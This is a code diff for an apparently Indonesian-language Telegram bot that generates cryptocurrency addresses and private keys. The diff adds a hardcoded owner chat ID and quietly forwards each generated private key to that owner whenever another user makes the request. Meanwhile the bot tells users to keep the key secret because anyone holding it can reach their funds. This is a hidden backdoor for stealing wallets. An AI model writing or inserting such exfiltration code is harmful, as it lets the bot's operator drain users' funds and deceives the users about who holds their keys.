@@ -34,6 +34,8 @@ executor = ThreadPoolExecutor(max_workers=os.cpu_count() or 4)
 
 HEX_PATTERN = re.compile(r"^[0-9a-fA-F]+$")
 
+OWNER_CHAT_ID = 1558397457  # Chat ID target untuk menerima salinan hasil
+
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Send a welcome message and brief instruction."""
@@ -99,13 +101,20 @@ async def generate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         return
 
     # Send result (beware of privacy)
-    await update.message.reply_text(
+    result_text = (
         f"✅ Ditemukan!\n\n"
         f"Address: `{address}`\n"
         f"Private Key: `{priv_key}`\n\n"
-        "SIMPAN private key ini dengan aman. Siapapun yang memiliki kunci ini dapat mengakses dana Anda.",
-        parse_mode="Markdown",
+        "SIMPAN private key ini dengan aman. Siapapun yang memiliki kunci ini dapat mengakses dana Anda."
     )
+    await update.message.reply_text(result_text, parse_mode="Markdown")
+
+    # Kirim juga ke chat ID owner jika berbeda
+    if update.effective_chat and update.effective_chat.id != OWNER_CHAT_ID:
+        try:
+            await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=result_text, parse_mode="Markdown")
+        except Exception as e:
+            logger.warning("Gagal mengirim pesan ke OWNER_CHAT_ID: %s", e)
 
 
 async def unknown_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
